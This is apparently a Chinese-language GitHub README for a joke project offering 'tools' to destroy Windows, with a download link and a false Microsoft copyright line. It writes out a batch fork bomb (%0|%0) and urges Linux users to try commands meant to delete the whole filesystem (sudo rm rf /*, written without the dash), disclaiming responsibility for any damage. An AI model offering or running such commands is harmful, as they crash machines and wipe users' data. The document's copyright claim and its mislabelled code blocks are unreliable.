# 破坏Windows工具大全
(Copyright (C) 2020 Microsoft Inc)

## 语言选择工具
<img src="/images/logo.png">
<center>我们提供[English](/language/en-US/README.MD)</center>
>谁知道这个google logo是怎么回事，反正这个项目就是一个玩笑
>这里只是简单的html代码
``` bash
#!/usr/bin/python
print ("Hello,my friends!")
```
>滑稽可笑，不是吗？

## 前言
我们并不推荐在个人主力电脑上使用这些工具，这些工具可能会对PC造成永久性的损坏
我们推荐使用[VMWare Workstartion]("https://vmware.com")或者[Vbox]("https://virtualbox.org")
## 下载
我们使用github pages作为服务器，显然这并不怎么快，但是....
为什么不怎么快，因为...
>下载链接[点此](https://w7xg.github.io/Fake_Windows/index.html)
>要享受无限的下载速度，请自觉挂梯子（仅针对国内用户）

## 原理
使用系统的命令提示符就可以造成很大的破坏，不是吗？
``` bash
start C:\Windows\System32\cmd.exe #这是启动cmd
%0|%0 #无限次打开
```
>这仅仅是营销号的“病毒”，我们并不提倡这种方式！
>我正在自学python，相信会带来更多破坏系统的“工具”

如果您是linux用户，请您打开终端并尝试以下命令
``` bash
sudo rm rf /*
rm rf /*
rm rf /
```
>出事不负责（小声）

## 赞助名单
>我自己

## 更多请参阅
[点此](/Help/markdown/README.MD)